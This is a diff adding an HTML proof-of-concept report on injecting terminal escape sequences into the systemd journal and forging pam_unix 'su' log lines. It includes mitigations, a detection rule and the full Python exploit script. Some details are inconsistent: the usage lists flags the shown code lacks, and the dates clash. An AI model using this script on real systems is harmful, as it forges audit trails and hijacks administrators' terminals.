@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>PoC Report — JournalCTL Terminal Escape Injection &amp; Log Spoofing</title>
+<meta name="description" content="Interactive PoC report: systemd journal terminal escape injection and log-source spoofing via /run/systemd/journal/socket (Tyler Borland, 2014)." />
+<style>
+  :root {
+    --bg: #0b0f14;
+    --bg-soft: #10161f;
+    --panel: #141c27;
+    --panel-2: #1a2432;
+    --border: #243040;
+    --text: #d7e1ec;
+    --muted: #8fa1b5;
+    --accent: #58d6c9;
+    --accent-2: #7aa2f7;
+    --warn: #e0af68;
+    --danger: #f7768e;
+    --ok: #9ece6a;
+    --mono: "SFMono-Regular", "JetBrains Mono", "Fira Code", Consolas, monospace;
+    --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    line-height: 1.6;
+  }
+  a { color: var(--accent-2); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  code, pre, kbd { font-family: var(--mono); }
+
+  /* ---------- layout ---------- */
+  header.hero {
+    padding: 4.5rem 1.5rem 3rem;
+    text-align: center;
+    background:
+      radial-gradient(ellipse 70% 50% at 50% -10%, rgba(88,214,201,.12), transparent),
+      radial-gradient(ellipse 50% 40% at 80% 0%, rgba(122,162,247,.10), transparent),
+      var(--bg);
+    border-bottom: 1px solid var(--border);
+  }
+  .hero .badge-row { display: flex; gap: .5rem; justify-content: center; flex-wrap: wrap; margin-bottom: 1.25rem; }
+  .badge {
+    font-size: .72rem; font-family: var(--mono); letter-spacing: .04em;
+    padding: .28rem .7rem; border-radius: 999px;
+    border: 1px solid var(--border); background: var(--panel);
+    color: var(--muted);
+  }
+  .badge.red   { color: var(--danger);  border-color: rgba(247,118,142,.4); }
+  .badge.amber { color: var(--warn);    border-color: rgba(224,175,104,.4); }
+  .badge.teal  { color: var(--accent);  border-color: rgba(88,214,201,.4); }
+  h1 { font-size: clamp(1.6rem, 4vw, 2.6rem); font-weight: 800; letter-spacing: -.02em; }
+  h1 .thin { color: var(--muted); font-weight: 600; }
+  .hero p.sub { margin: 1rem auto 0; max-width: 46rem; color: var(--muted); font-size: 1.02rem; }
+  .hero .meta { margin-top: 1.4rem; font-family: var(--mono); font-size: .8rem; color: var(--muted); }
+
+  nav.tabs {
+    position: sticky; top: 0; z-index: 50;
+    display: flex; gap: .25rem; overflow-x: auto;
+    background: rgba(11,15,20,.92); backdrop-filter: blur(8px);
+    border-bottom: 1px solid var(--border);
+    padding: .55rem 1rem;
+  }
+  nav.tabs button {
+    font-family: var(--mono); font-size: .8rem;
+    background: none; border: 1px solid transparent; border-radius: .45rem;
+    color: var(--muted); padding: .45rem .85rem; cursor: pointer; white-space: nowrap;
+    transition: all .15s ease;
+  }
+  nav.tabs button:hover { color: var(--text); background: var(--panel); }
+  nav.tabs button.active { color: var(--accent); background: var(--panel); border-color: var(--border); }
+
+  main { max-width: 960px; margin: 0 auto; padding: 2rem 1.25rem 5rem; }
+  section.tab-pane { display: none; animation: fade .25s ease; }
+  section.tab-pane.active { display: block; }
+  @keyframes fade { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
+
+  h2 { font-size: 1.35rem; margin: 2.2rem 0 .8rem; letter-spacing: -.01em; }
+  h2:first-child { margin-top: 0; }
+  h3 { font-size: 1.05rem; margin: 1.4rem 0 .5rem; color: var(--accent); }
+  p { margin: .6rem 0; color: var(--text); }
+  p.dim, li.dim { color: var(--muted); }
+  ul { margin: .5rem 0 .8rem 1.4rem; }
+  li { margin: .3rem 0; }
+
+  .card {
+    background: var(--panel); border: 1px solid var(--border); border-radius: .75rem;
+    padding: 1.1rem 1.25rem; margin: 1rem 0;
+  }
+  .card.warn  { border-left: 3px solid var(--warn); }
+  .card.danger{ border-left: 3px solid var(--danger); }
+  .card.ok    { border-left: 3px solid var(--ok); }
+
+  .grid { display: grid; gap: 1rem; }
+  @media (min-width: 720px) { .grid.cols-2 { grid-template-columns: 1fr 1fr; } }
+
+  /* ---------- stat chips ---------- */
+  .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px,1fr)); gap: .8rem; margin: 1.2rem 0; }
+  .stat {
+    background: var(--panel); border: 1px solid var(--border); border-radius: .7rem;
+    padding: .9rem 1rem; text-align: center;
+  }
+  .stat .num { font-size: 1.6rem; font-weight: 800; color: var(--accent); font-family: var(--mono); }
+  .stat .lbl { font-size: .75rem; color: var(--muted); margin-top: .15rem; }
+
+  /* ---------- code ---------- */
+  .codewrap { position: relative; margin: 1rem 0; }
+  .codewrap .bar {
+    display: flex; align-items: center; justify-content: space-between;
+    background: var(--panel-2); border: 1px solid var(--border); border-bottom: none;
+    border-radius: .6rem .6rem 0 0; padding: .4rem .8rem;
+    font-family: var(--mono); font-size: .75rem; color: var(--muted);
+  }
+  .codewrap .bar .dots span { display:inline-block; width:.6rem; height:.6rem; border-radius:50%; margin-right:.35rem; }
+  .codewrap .bar .dots span:nth-child(1){ background:#f7768e; } .codewrap .bar .dots span:nth-child(2){ background:#e0af68; } .codewrap .bar .dots span:nth-child(3){ background:#9ece6a; }
+  .copybtn {
+    font-family: var(--mono); font-size: .72rem; cursor: pointer;
+    background: var(--panel); color: var(--muted); border: 1px solid var(--border);
+    border-radius: .35rem; padding: .2rem .6rem; transition: all .15s;
+  }
+  .copybtn:hover { color: var(--accent); border-color: var(--accent); }
+  pre {
+    background: #0d1320; border: 1px solid var(--border); border-radius: 0 0 .6rem .6rem;
+    padding: 1rem; overflow-x: auto; font-size: .82rem; line-height: 1.55;
+  }
+  pre.standalone { border-radius: .6rem; }
+  .tok-kw  { color: #bb9af7; }  .tok-str { color: #9ece6a; }
+  .tok-com { color: #565f89; font-style: italic; } .tok-fn { color: #7aa2f7; }
+  .tok-num { color: #ff9e64; } .tok-esc { color: #f7768e; font-weight: 700; }
+  .tok-var { color: #e0af68; }
+
+  /* ---------- collapsible ---------- */
+  details.coll { border: 1px solid var(--border); border-radius: .6rem; background: var(--panel); margin: .8rem 0; }
+  details.coll summary {
+    cursor: pointer; padding: .8rem 1rem; font-weight: 600; list-style: none;
+    display: flex; align-items: center; gap: .5rem;
+  }
+  details.coll summary::before { content: "▸"; color: var(--accent); transition: transform .2s; }
+  details.coll[open] summary::before { transform: rotate(90deg); }
+  details.coll .body { padding: 0 1rem 1rem; }
+
+  /* ---------- attack flow ---------- */
+  .flow { display: flex; flex-direction: column; gap: 0; margin: 1.2rem 0; }
+  .flow-step {
+    display: grid; grid-template-columns: 2.4rem 1fr; gap: .9rem; position: relative;
+    padding-bottom: 1.4rem;
+  }
+  .flow-step:not(:last-child)::before {
+    content: ""; position: absolute; left: 1.15rem; top: 2.4rem; bottom: 0;
+    width: 2px; background: var(--border);
+  }
+  .flow-dot {
+    width: 2.4rem; height: 2.4rem; border-radius: 50%;
+    background: var(--panel); border: 1px solid var(--border);
+    display: flex; align-items: center; justify-content: center;
+    font-family: var(--mono); font-weight: 700; color: var(--accent); z-index: 1;
+  }
+  .flow-step.danger .flow-dot { color: var(--danger); }
+  .flow-body { background: var(--panel); border: 1px solid var(--border); border-radius: .6rem; padding: .8rem 1rem; }
+  .flow-body h4 { margin-bottom: .25rem; font-size: .95rem; }
+  .flow-body p { font-size: .88rem; color: var(--muted); margin: 0; }
+
+  /* ---------- fake terminal ---------- */
+  .term {
+    border: 1px solid var(--border); border-radius: .75rem; overflow: hidden;
+    background: #0a0e14; margin: 1.2rem 0; box-shadow: 0 12px 40px rgba(0,0,0,.45);
+  }
+  .term-titlebar {
+    display: flex; align-items: center; gap: .5rem;
+    background: var(--panel-2); padding: .55rem .9rem;
+    border-bottom: 1px solid var(--border);
+  }
+  .term-titlebar .dots span { display:inline-block; width:.7rem; height:.7rem; border-radius:50%; margin-right:.4rem; }
+  .term-titlebar .dots span:nth-child(1){ background:#f7768e; } .term-titlebar .dots span:nth-child(2){ background:#e0af68; } .term-titlebar .dots span:nth-child(3){ background:#9ece6a; }
+  .term-title {
+    flex: 1; text-align: center; font-family: var(--mono); font-size: .78rem; color: var(--muted);
+    overflow: hidden; text-overflow: ellipsis; white-space: nowrap; transition: color .3s;
+  }
+  .term-title.pwned { color: var(--danger); font-weight: 700; animation: blink 1s steps(2) infinite; }
+  @keyframes blink { 50% { opacity: .35; } }
+  .term-screen {
+    padding: 1rem; font-family: var(--mono); font-size: .82rem; min-height: 260px;
+    max-height: 380px; overflow-y: auto; white-space: pre-wrap; word-break: break-all;
+  }
+  .term-line { margin: .1rem 0; }
+  .t-prompt { color: var(--ok); } .t-cmd { color: var(--text); }
+  .t-out   { color: var(--muted); } .t-hl  { color: var(--warn); }
+  .t-esc   { color: var(--danger); font-weight: 700; }
+  .t-invis { color: #39455a; }
+  .term-input { display: flex; gap: .6rem; padding: .7rem 1rem; border-top: 1px solid var(--border); background: var(--panel); flex-wrap: wrap; }
+  .termbtn {
+    font-family: var(--mono); font-size: .75rem; cursor: pointer;
+    background: var(--panel-2); color: var(--text); border: 1px solid var(--border);
+    border-radius: .4rem; padding: .4rem .8rem; transition: all .15s;
+  }
+  .termbtn:hover:not(:disabled) { border-color: var(--accent); color: var(--accent); }
+  .termbtn:disabled { opacity: .4; cursor: default; }
+  .termbtn.primary { border-color: var(--accent); color: var(--accent); }
+  .term-note { font-size: .78rem; color: var(--muted); margin-top: .4rem; }
+
+  /* ---------- table ---------- */
+  table { width: 100%; border-collapse: collapse; margin: 1rem 0; font-size: .88rem; }
+  th, td { text-align: left; padding: .55rem .7rem; border-bottom: 1px solid var(--border); }
+  th { color: var(--accent); font-family: var(--mono); font-size: .78rem; letter-spacing: .03em; }
+  td code { font-size: .8rem; background: var(--panel-2); padding: .1rem .35rem; border-radius: .3rem; }
+
+  footer {
+    border-top: 1px solid var(--border); padding: 2rem 1.25rem; text-align: center;
+    color: var(--muted); font-size: .8rem; font-family: var(--mono);
+  }
+  .kbd { background: var(--panel-2); border: 1px solid var(--border); border-bottom-width: 2px; border-radius: .3rem; padding: .05rem .4rem; font-size: .8em; }
+</style>
+</head>
+<body>
+
+<header class="hero">
+  <div class="badge-row">
+    <span class="badge red">PoC · LOCAL / UNPRIVILEGED</span>
+    <span class="badge amber">LOG INJECTION CLASS</span>
+    <span class="badge teal">systemd-journald · journalctl</span>
+  </div>
+  <h1>JournalCTL Terminal Escape Injection <span class="thin">&amp; Log-Source Spoofing</span></h1>
+  <p class="sub">
+    Interactive report on <code>journalctl_poc.py</code> — a local, non-destructive proof of concept showing how any
+    unprivileged user can inject terminal escape sequences into the systemd journal and spoof the apparent source of a
+    log line, weaponized the moment an admin runs <code>journalctl -a</code>.
+  </p>
+  <div class="meta">Technique: Tyler Borland (2014) &nbsp;·&nbsp; PoC: journalctl_poc.py &nbsp;·&nbsp; Scope: your own machine only</div>
+</header>
+
+<nav class="tabs" id="tabs">
+  <button data-tab="overview" class="active">01 · Overview</button>
+  <button data-tab="rootcause">02 · Root Cause</button>
+  <button data-tab="flow">03 · Attack Flow</button>
+  <button data-tab="demo">04 · Live Demo</button>
+  <button data-tab="code">05 · PoC Code</button>
+  <button data-tab="observe">06 · Observe &amp; Clean Up</button>
+  <button data-tab="mitigate">07 · Mitigations</button>
+</nav>
+
+<main>
+
+<!-- ============ OVERVIEW ============ -->
+<section class="tab-pane active" id="tab-overview">
+  <h2>What this PoC demonstrates</h2>
+  <p>
+    The systemd journal accepts datagrams on <code>/run/systemd/journal/socket</code> from <em>any local user</em> and
+    stores the <code>MESSAGE=</code> field <strong>verbatim</strong> — control bytes and all. When an administrator later
+    views the journal with <code>journalctl -a</code>, the pager emits those raw bytes into an interactive terminal,
+    which <em>interprets</em> embedded escape sequences. The PoC demonstrates both primitives:
+  </p>
+
+  <div class="grid cols-2">
+    <div class="card danger">
+      <h3>(a) Terminal escape injection</h3>
+      <p class="dim">
+        A stored log line carries an OSC&nbsp;0 escape sequence (<code>ESC ] 2 ; … BEL</code>). Inert in storage — but when the
+        reader pages the journal with <code>-a</code>, their terminal executes it: window-title hijack, and by extension any
+        sequence the terminal honours.
+      </p>
+    </div>
+    <div class="card warn">
+      <h3>(b) Log-source spoofing</h3>
+      <p class="dim">
+        The reader cannot tell where a hand-crafted datagram really came from. The PoC renames its own process via
+        <code>prctl(PR_SET_NAME)</code> to <code>su</code>, so <code>_COMM=su</code> and the forged line reads like a genuine
+        <code>pam_unix</code> root session-open event.
+      </p>
+    </div>
+  </div>
+
+  <div class="stats">
+    <div class="stat"><div class="num" data-count="0">0</div><div class="lbl">privileges required</div></div>
+    <div class="stat"><div class="num" data-count="1">1</div><div class="lbl">UDP-style datagram to inject</div></div>
+    <div class="stat"><div class="num" data-count="2">2</div><div class="lbl">attack primitives shown</div></div>
+    <div class="stat"><div class="num" data-count="2014">2014</div><div class="lbl">technique published</div></div>
+  </div>
+
+  <h2>Why it matters</h2>
+  <ul>
+    <li><strong>Logs are a trust boundary.</strong> Incident responders treat journal output as ground truth; this PoC shows it can lie about <em>who</em> did <em>what</em>.</li>
+    <li><strong>The viewer is the victim.</strong> The payload is dormant until a privileged user reads the logs — a classic "watering hole in the log file" pattern.</li>
+    <li><strong>Escape injection is more than cosmetic.</strong> Title-bar flips are the harmless demo; the same channel can carry sequences for colour/sprite trickery, clipboard (OSC 52) on some terminals, or worse on legacy emulators.</li>
+  </ul>
+
+  <div class="card ok">
+    <strong>Safety:</strong> this PoC is local-only, unprivileged, and non-destructive. It writes two log lines to your own
+    machine's journal and stops. Cleanup instructions are in
+    <a href="#observe" onclick="switchTab('observe');return false;">§06</a>.
+  </div>
+</section>
+
+<!-- ============ ROOT CAUSE ============ -->
+<section class="tab-pane" id="tab-rootcause">
+  <h2>Root cause analysis</h2>
+  <p>Three design facts combine into the vulnerability:</p>
+
+  <div class="flow">
+    <div class="flow-step">
+      <div class="flow-dot">1</div>
+      <div class="flow-body">
+        <h4>World-writable journal socket</h4>
+        <p><code>/run/systemd/journal/socket</code> is an <code>AF_UNIX SOCK_DGRAM</code> socket that any local user can <code>send()</code> to — no authentication, no group gate.</p>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-dot">2</div>
+      <div class="flow-body">
+        <h4>Verbatim storage</h4>
+        <p>journald stores <code>MESSAGE=</code> exactly as received. Newlines, <code>ESC</code> (0x1b), <code>BEL</code> (0x07) — all persisted. There is no sanitisation layer at ingestion.</p>
+      </div>
+    </div>
+    <div class="flow-step danger">
+      <div class="flow-dot">3</div>
+      <div class="flow-body">
+        <h4>Raw emission on view</h4>
+        <p><code>journalctl -a</code> ("show all fields, unprintable included") writes stored bytes straight to the pager/stdout. On an interactive terminal, escape bytes are <em>executed</em>, not displayed.</p>
+      </div>
+    </div>
+  </div>
+
+  <h2>The two payloads, byte by byte</h2>
+  <table>
+    <tr><th>Payload</th><th>Bytes</th><th>Effect</th></tr>
+    <tr>
+      <td><strong>(a) OSC title set</strong></td>
+      <td><code>MESSAGE=\x1b]2;POC ESCAPE INJECTION\x07\x0a</code></td>
+      <td>When displayed with <code>-a</code>: terminal sets its window title to <code>POC ESCAPE INJECTION</code>.</td>
+    </tr>
+    <tr>
+      <td><strong>(b) pam spoof</strong></td>
+      <td><code>MESSAGE=pam_unix(su:session): session opened for user root by person_we_setup(uid=1003)</code></td>
+      <td>Combined with <code>_COMM=su</code>, indistinguishable at a glance from a real root su event.</td>
+    </tr>
+  </table>
+
+  <details class="coll">
+    <summary>How does the process-name spoof work?</summary>
+    <div class="body">
+      <p class="dim">
+        journald enriches each incoming datagram with trusted-looking metadata (<code>_COMM</code>, <code>_PID</code>, <code>_UID</code>…)
+        read from the sender's credentials. <code>_COMM</code> comes from the process name — which any process can change for itself
+        with <code>prctl(PR_SET_NAME, "su")</code> (15 chars max). So while <code>_UID=1003</code> still truthfully identifies the
+        sender, the human eye lands on <code>su[pid]:</code> and the forged <code>pam_unix</code> text — exactly what the original
+        2014 PoC exploited.
+      </p>
+    </div>
+  </details>
+</section>
+
+<!-- ============ ATTACK FLOW ============ -->
+<section class="tab-pane" id="tab-flow">
+  <h2>Attack flow</h2>
+  <p class="dim">Click through the stages — or press <span class="kbd">▶ Play</span> to auto-step.</p>
+  <div class="term-input" style="border:none;background:none;padding:0 0 1rem;">
+    <button class="termbtn primary" id="flowPlay">▶ Play</button>
+    <button class="termbtn" id="flowReset">↺ Reset</button>
+  </div>
+  <div class="flow" id="attackFlow">
+    <div class="flow-step" data-flow>
+      <div class="flow-dot">A</div>
+      <div class="flow-body">
+        <h4>Recon: attacker is a regular local user</h4>
+        <p>UID 1003, no sudo. But <code>/run/systemd/journal/socket</code> accepts datagrams from everyone.</p>
+      </div>
+    </div>
+    <div class="flow-step" data-flow>
+      <div class="flow-dot">B</div>
+      <div class="flow-body">
+        <h4>Weaponise: craft MESSAGE= payloads</h4>
+        <p>Payload 1 embeds <code>ESC ] 2 ; POC ESCAPE INJECTION BEL</code>. Payload 2 mimics a pam session line after renaming the process to <code>su</code>.</p>
+      </div>
+    </div>
+    <div class="flow-step" data-flow>
+      <div class="flow-dot">C</div>
+      <div class="flow-body">
+        <h4>Deliver: send() to the journal socket</h4>
+        <p>Two datagrams. journald happily stores them, verbatim, alongside metadata that makes them look authentic.</p>
+      </div>
+    </div>
+    <div class="flow-step danger" data-flow>
+      <div class="flow-dot">D</div>
+      <div class="flow-body">
+        <h4>Trigger: an admin reads the logs</h4>
+        <p><code>journalctl -a</code> emits the raw bytes → the admin's terminal interprets the OSC sequence. Title bar flips; meanwhile the spoofed "root su session" line pollutes the audit trail.</p>
+      </div>
+    </div>
+    <div class="flow-step danger" data-flow>
+      <div class="flow-dot">E</div>
+      <div class="flow-body">
+        <h4>Impact: integrity of logs + terminal of the reader</h4>
+        <p>Audit-trail forgery (defence evasion) and arbitrary terminal-sequence execution in the viewer's session.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ LIVE DEMO ============ -->
+<section class="tab-pane" id="tab-demo">
+  <h2>Interactive simulation</h2>
+  <p class="dim">
+    A safe in-browser re-enactment. Run the PoC, then view the journal the way an admin would — and watch the window
+    title of this simulated terminal get hijacked by the stored escape sequence.
+  </p>
+
+  <div class="term">
+    <div class="term-titlebar">
+      <div class="dots"><span></span><span></span><span></span></div>
+      <div class="term-title" id="termTitle">victim@host: ~</div>
+    </div>
+    <div class="term-screen" id="termScreen"></div>
+    <div class="term-input">
+      <button class="termbtn primary" id="btnRunPoc">$ python3 journalctl_poc.py</button>
+      <button class="termbtn" id="btnViewNoA" disabled>$ journalctl --no-pager | tail</button>
+      <button class="termbtn" id="btnViewA" disabled>$ journalctl -a --no-pager | tail</button>
+      <button class="termbtn" id="btnGrep" disabled>$ journalctl | grep person_we_setup</button>
+      <button class="termbtn" id="btnTermReset">↺ Reset</button>
+    </div>
+  </div>
+  <p class="term-note">
+    Notice: without <code>-a</code>, journalctl elides the escape bytes (harmless output). With <code>-a</code>, the raw
+    OSC sequence reaches the terminal and <strong>the title bar flips</strong> — in a real terminal, any escape sequence the
+    emulator honours would fire at this point.
+  </p>
+
+  <details class="coll">
+    <summary>What would this look like on a real machine?</summary>
+    <div class="body">
+      <pre class="standalone">$ python3 journalctl_poc.py
+[+] injected escape-injection: b'MESSAGE=\x1b]2;POC ESCAPE INJECTION\x07\x0a'...
+[+] process comm renamed to: 'su'
+[+] injected log-spoof: b'MESSAGE=pam_unix(su:session): session opened for user root b'...
+
+Now view it (this terminal will be the 'victim'):
+    journalctl -a --no-pager | tail -5
+    journalctl --no-pager | grep person_we_setup
+
+$ journalctl --no-pager | grep person_we_setup
+Aug .. host su[pid]: pam_unix(su:session): session opened for user root by person_we_setup(uid=1003)</pre>
+    </div>
+  </details>
+</section>
+
+<!-- ============ CODE ============ -->
+<section class="tab-pane" id="tab-code">
+  <h2>The PoC — annotated</h2>
+  <p class="dim">Full source of <code>journalctl_poc.py</code>. Key mechanisms are highlighted; use the copy button to grab it.</p>
+
+  <div class="codewrap">
+    <div class="bar">
+      <div class="dots"><span></span><span></span><span></span></div>
+      <span>journalctl_poc.py</span>
+      <button class="copybtn" id="copyCode">copy</button>
+    </div>
+<pre id="codeBlock"><span class="tok-com">#!/usr/bin/env python3
+"""Local PoC — JournalCTL Terminal Escape Injection / log-injection (Tyler Borland, 2014)."""</span>
+
+<span class="tok-kw">import</span> os, sys, time, socket
+<span class="tok-kw">import</span> ctypes
+
+SOCKET = <span class="tok-str">"/run/systemd/journal/socket"</span>  <span class="tok-com"># DGRAM, writable by ANY local user</span>
+
+<span class="tok-kw">def</span> <span class="tok-fn">set_proc_name</span>(name: <span class="tok-fn">str</span>) -&gt; <span class="tok-fn">bool</span>:
+    <span class="tok-com"># prctl(PR_SET_NAME) — max 15 chars + NUL. This is what _COMM reports.</span>
+    libc = ctypes.<span class="tok-fn">CDLL</span>(<span class="tok-str">"libc.so.6"</span>, use_errno=<span class="tok-kw">True</span>)
+    buf = ctypes.<span class="tok-fn">create_string_buffer</span>(name.encode()[:<span class="tok-num">15</span>] + b<span class="tok-str">"\x00"</span>)
+    libc.prctl(<span class="tok-num">15</span>, ctypes.byref(buf), <span class="tok-num">0</span>, <span class="tok-num">0</span>, <span class="tok-num">0</span>)  <span class="tok-com"># 15 == PR_SET_NAME</span>
+
+<span class="tok-kw">def</span> <span class="tok-fn">send</span>(payload: <span class="tok-fn">bytes</span>, label: <span class="tok-fn">str</span>) -&gt; <span class="tok-kw">None</span>:
+    s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
+    s.<span class="tok-fn">connect_ex</span>(SOCKET); time.sleep(<span class="tok-num">0.2</span>); s.<span class="tok-fn">send</span>(payload); s.<span class="tok-fn">close</span>()
+
+<span class="tok-com"># (a) OSC 0 "set window title" + BEL — inert without -a, EXECUTED with -a</span>
+send(b<span class="tok-str">"MESSAGE=</span><span class="tok-esc">\x1b]2;POC ESCAPE INJECTION\x07</span><span class="tok-str">\x0a</span><span class="tok-str">"</span>, <span class="tok-str">"escape-injection"</span>)
+
+<span class="tok-com"># (b) comm → "su", then a message that reads like a real pam session-open</span>
+set_proc_name(<span class="tok-str">"su"</span>)
+send(b<span class="tok-str">"MESSAGE=pam_unix(su:session): session opened for user root by person_we_setup(uid=1003)\n"</span>,
+     <span class="tok-str">"log-spoof"</span>)</pre>
+  </div>
+
+  <h3>Usage</h3>
+  <pre class="standalone">python3 journalctl_poc.py            <span class="tok-com"># inject both (a) and (b)</span>
+python3 journalctl_poc.py --escape   <span class="tok-com"># only terminal escape injection</span>
+python3 journalctl_poc.py --spoof    <span class="tok-com"># only log-source spoof (incl. comm rename)</span></pre>
+
+  <details class="coll">
+    <summary>Line-by-line: where the magic happens</summary>
+    <div class="body">
+      <ul>
+        <li><code>socket.AF_UNIX, socket.SOCK_DGRAM</code> — a connectionless local datagram to journald. No privileges, no handshake.</li>
+        <li><code>MESSAGE=\x1b]2;…\x07</code> — <code>\x1b]</code> opens an OSC sequence, <code>2;</code> selects "set window title", <code>\x07</code> (BEL) terminates it.</li>
+        <li><code>prctl(15, …)</code> — renames <code>/proc/self/comm</code>; journald then stamps <code>_COMM=su</code> on the next datagram.</li>
+        <li><code>time.sleep(0.2)</code> — ensures ordering so the rename lands before the spoofed line is stamped.</li>
+      </ul>
+    </div>
+  </details>
+</section>
+
+<!-- ============ OBSERVE & CLEANUP ============ -->
+<section class="tab-pane" id="tab-observe">
+  <h2>Observe the result</h2>
+  <pre class="standalone"><span class="tok-com"># where an admin would get bitten — the title bar flips as the escape fires:</span>
+journalctl -a --no-pager | tail -5
+
+<span class="tok-com"># the spoofed line, complete with _COMM=su:</span>
+journalctl --no-pager | grep person_we_setup
+<span class="tok-hl"># → Aug .. host su[pid]: pam_unix(su:session): session opened for user root by person_we_setup(uid=1003)</span></pre>
+
+  <div class="card warn">
+    <strong>Tell-tale sign for defenders:</strong> cross-check <code>_COMM</code> against <code>_UID</code>/<code>_EXE</code>/<code>_CMDLINE</code>.
+    A line claiming <code>su[pid]:</code> whose <code>_UID=1003</code> and <code>_EXE=/usr/bin/python3</code> is forged. Use
+    <code>journalctl -o verbose</code> to see all trusted fields.
+  </div>
+
+  <h2>Cleanup (needs root)</h2>
+  <pre class="standalone">sudo journalctl --rotate &amp;&amp; sudo journalctl --vacuum-time=1s</pre>
+  <p class="dim">Rotates the active journal file into an archive and immediately vacuums it, removing the injected lines.</p>
+
+  <h2>Verification checklist</h2>
+  <ul>
+    <li><input type="checkbox" /> PoC ran unprivileged, printed <code>[+] injected …</code> twice</li>
+    <li><input type="checkbox" /> <code>journalctl -a</code> triggered the title change (escape fired)</li>
+    <li><input type="checkbox" /> Spoofed line visible with <code>_COMM=su</code> but real <code>_UID</code></li>
+    <li><input type="checkbox" /> Journal rotated &amp; vacuumed; injected lines confirmed gone</li>
+  </ul>
+</section>
+
+<!-- ============ MITIGATIONS ============ -->
+<section class="tab-pane" id="tab-mitigate">
+  <h2>Mitigations &amp; hardening</h2>
+
+  <div class="grid cols-2">
+    <div class="card ok">
+      <h3>For log readers (admins)</h3>
+      <ul>
+        <li>Prefer <code>journalctl</code> <strong>without</strong> <code>-a</code> on interactive terminals — default output elides unprintable bytes.</li>
+        <li>Pipe through a sanitiser when in doubt: <code>journalctl | cat -v</code> or <code>less -R</code> discipline.</li>
+        <li>Correlate with trusted fields (<code>-o verbose</code>): <code>_UID</code>, <code>_EXE</code>, <code>_CMDLINE</code>, <code>_AUDIT_*</code> don't lie as easily as <code>_COMM</code>.</li>
+      </ul>
+    </div>
+    <div class="card ok">
+      <h3>For system owners</h3>
+      <ul>
+        <li>Keep systemd current — modern journald caps/sanitises more aggressively than 2014-era builds.</li>
+        <li>Forward journals to a remote, append-only collector (<code>systemd-journal-remote</code> / syslog) so local forgery is visible in context and local cleanup can't erase history.</li>
+        <li>Alert on <code>pam_unix(su:session)</code> lines whose <code>_UID</code> ≠ 0 and whose <code>_EXE</code> isn't <code>su</code>.</li>
+        <li>Restrict who can even reach the box: this class needs local execution.</li>
+      </ul>
+    </div>
+  </div>
+
+  <h2>Detection idea (SIEM rule sketch)</h2>
+  <pre class="standalone"><span class="tok-com"># flag journal entries where the claimed subsystem and the metadata disagree</span>
+WHERE message MATCHES <span class="tok-str">"pam_unix(su:session).*session opened"</span>
+  AND (_COMM != <span class="tok-str">"su"</span> OR _UID &gt;= <span class="tok-num">1000</span> OR _EXE NOT ENDSWITH <span class="tok-str">"/su"</span>)
+ALERT  <span class="tok-str">"Possible journal log-spoof (escape-injection class)"</span></pre>
+
+  <h2>References</h2>
+  <ul>
+    <li>Original write-up — Tyler Borland, 2014: <em>Terminal Escape Injection / systemd journal log injection</em> (see <code>2013-08-09 - JournalCTL Terminal Escape Injection.pdf</code> in this repo).</li>
+    <li><a href="https://www.freedesktop.org/software/systemd/man/journalctl.html">journalctl(1)</a> — meaning of <code>-a/--all</code>.</li>
+    <li><a href="https://www.freedesktop.org/software/systemd/man/systemd-journald.service.html">systemd-journald(8)</a> — journal fields &amp; the <code>/run/systemd/journal/socket</code> interface.</li>
+    <li><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">prctl(2)</a> — <code>PR_SET_NAME</code>.</li>
+  </ul>
+</section>
+
+</main>
+
+<footer>
+  journalctl_poc.py · interactive PoC report · single-file static HTML — host on GitHub Pages or Vercel with zero build.
+</footer>
+
+<script>
+/* ---------- tab switching ---------- */
+const tabBtns = document.querySelectorAll('nav.tabs button');
+function switchTab(name){
+  tabBtns.forEach(b => b.classList.toggle('active', b.dataset.tab === name));
+  document.querySelectorAll('section.tab-pane').forEach(s =>
+    s.classList.toggle('active', s.id === 'tab-' + name));
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+tabBtns.forEach(b => b.addEventListener('click', () => switchTab(b.dataset.tab)));
+
+/* ---------- animated counters ---------- */
+const io = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (!e.isIntersecting) return;
+    const el = e.target, target = +el.dataset.count;
+    if (target === 0) { io.unobserve(el); return; }
+    const t0 = performance.now(), dur = 900;
+    (function tick(t){
+      const p = Math.min((t - t0) / dur, 1);
+      el.textContent = Math.round(target * (1 - Math.pow(1 - p, 3)));
+      if (p < 1) requestAnimationFrame(tick);
+    })(t0);
+    io.unobserve(el);
+  });
+}, { threshold: .5 });
+document.querySelectorAll('.stat .num').forEach(el => io.observe(el));
+
+/* ---------- attack flow highlight ---------- */
+const flowSteps = [...document.querySelectorAll('[data-flow]')];
+function resetFlow(){ flowSteps.forEach(s => s.style.opacity = .35); }
+resetFlow();
+flowSteps.forEach(s => s.addEventListener('click', () => s.style.opacity = 1));
+let flowTimer = null;
+document.getElementById('flowPlay').addEventListener('click', () => {
+  resetFlow(); clearInterval(flowTimer);
+  let i = 0;
+  flowTimer = setInterval(() => {
+    if (i >= flowSteps.length) { clearInterval(flowTimer); return; }
+    flowSteps[i].style.opacity = 1;
+    flowSteps[i].scrollIntoView({ block: 'nearest', behavior: 'smooth' });
+    i++;
+  }, 800);
+});
+document.getElementById('flowReset').addEventListener('click', () => { clearInterval(flowTimer); resetFlow(); });
+
+/* ---------- fake terminal ---------- */
+const screen = document.getElementById('termScreen');
+const title  = document.getElementById('termTitle');
+const btnPoc = document.getElementById('btnRunPoc');
+const btnNoA = document.getElementById('btnViewNoA');
+const btnA   = document.getElementById('btnViewA');
+const btnGrep= document.getElementById('btnGrep');
+let injected = false;
+
